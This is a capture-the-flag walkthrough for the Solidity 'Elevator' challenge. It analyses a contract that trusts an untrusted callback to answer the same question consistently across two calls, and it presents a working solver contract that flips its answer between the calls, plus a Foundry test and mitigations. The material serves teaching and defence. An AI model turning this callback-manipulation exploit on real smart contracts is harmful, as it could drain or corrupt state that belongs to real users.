# 11. Elevator

[English](11_Elevator.md) | [한국어](../ko/11_Elevator.md)

## Objective

Reach the top floor by making `Elevator.top()` become `true`.

## Key Concepts

- Callback trust boundaries
- Mutable return values
- Repeated external calls
- State-dependent interfaces
- Consistency checks

## Contract Analysis

`goTo()` treats `msg.sender` as a `Building` and asks it the same question twice:

```solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
    }
}
```

The first callback must return `false` to enter the `if` block. The second callback must return `true` so that `top` is stored as `true`. Nothing requires the callback to return a stable answer for the same floor.

## Why the Callback Can Change Its Answer

An external call transfers execution to code controlled by another contract. The target does not receive a mathematical fact; it receives whatever value the callback contract chooses at that moment.

`isLastFloor()` is not declared `view`, so the callback can update state between calls. The solver starts with `nextAnswer = true` and toggles it before each return:

```text
Initial state: nextAnswer = true
First callback:  toggle → false, return false
Second callback: toggle → true,  return true
```

The same input therefore produces the two answers required by the target.

## Solver Contract

```solidity
function isLastFloor(uint256) external returns (bool) {
    nextAnswer = !nextAnswer;
    return nextAnswer;
}

function solve(address target) external {
    IElevator(target).goTo(10);
}
```

The requested floor number is not important to the callback. What matters is the order of the two responses.

## Solution Flow

```text
Player calls ElevatorSolver.solve()
        ↓
Solver calls Elevator.goTo(10)
        ↓
Elevator calls solver.isLastFloor(10)
        ↓
Solver returns false
        ↓
Elevator records floor = 10
        ↓
Elevator calls solver.isLastFloor(10) again
        ↓
Solver returns true
        ↓
Elevator records top = true
```

## Foundry Test

The test verifies both the initial and final state:

```solidity
assertFalse(target.top());
assertEq(target.floor(), 0);

vm.prank(player);
solver.solve(address(target));

assertTrue(target.top());
assertEq(target.floor(), 10);
```

## Root Cause

The target assumes that an untrusted callback will return a consistent answer across two separate calls. That assumption is not enforced by the EVM or by the interface.

## Recommended Mitigations

- Call an external data source once and store the returned value locally.
- Do not use repeated callbacks as an integrity check.
- Treat every external callback as mutable and potentially state-dependent.
- Declare read-only interfaces as `view` where appropriate, while still avoiding unnecessary repeated calls.
- Keep security-critical decisions inside a trusted state machine instead of delegating them to the caller.

## Run the Test

```bash
forge test --match-path test/11_Elevator.t.sol -vvv
```

## Takeaway

Two calls with the same arguments do not have to return the same value. Once execution crosses a contract boundary, the caller must treat the result as untrusted external state.
